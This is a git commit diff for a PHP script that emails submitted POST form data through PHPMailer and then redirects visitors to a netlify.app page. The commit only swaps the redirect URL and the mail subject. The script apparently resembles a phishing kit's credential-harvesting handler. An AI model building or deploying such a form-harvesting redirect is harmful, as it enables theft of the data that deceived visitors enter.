26a6eefdf6e812611f89027086424a94466aba8f
Abr33sarazubarlink <lali.andra76@gmail.com>
2025-07-23 18:30:22 +0500

    Update and rename Uzar.php to Shadi.php

--- Shadi.php
+++ Shadi.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://effervescent-melba-145e4e.netlify.app/");
+header("Location: https://monumental-sawine-814de5.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'uzar';
+        $mail->Subject = 'shadi';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
